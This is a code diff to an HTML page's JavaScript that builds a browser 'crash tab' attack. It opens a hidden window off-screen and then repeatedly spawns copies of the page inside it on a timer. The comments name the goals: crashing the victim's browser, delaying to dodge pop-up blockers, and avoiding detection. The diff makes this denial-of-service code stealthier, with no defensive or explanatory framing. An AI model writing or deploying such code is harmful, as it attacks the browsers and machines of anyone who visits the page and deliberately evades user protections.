@@ -10,17 +10,19 @@
     <script>
         function openHiddenWindow(numTabs) {
             let newWin = window.open("https://www.google.com", "_blank", "width=800,height=600,left=5000,top=5000"); // Opens off-screen
+            
             if (newWin) {
                 setTimeout(() => {
-                    newWin.eval(`
-                        function openCrashTabs() {
-                            for (let i = 0; i < ${numTabs}; i++) {
-                                window.open("${window.location.href}", "_blank");
-                            }
+                    let count = 0;
+                    let interval = setInterval(() => {
+                        if (count >= numTabs) {
+                            clearInterval(interval);
+                        } else {
+                            newWin.open(window.location.href, '_blank'); // Open crash tabs inside hidden window
+                            count++;
                         }
-                        setTimeout(openCrashTabs, 1000); // Delayed execution
-                    `);
-                }, 2000);
+                    }, 700); // Delay between new tab openings to avoid detection
+                }, 2000); // Initial delay to avoid pop-up blockers
             }
         }
 
@@ -58,5 +60,4 @@
     </script>
 </body>
 </html>
-
 
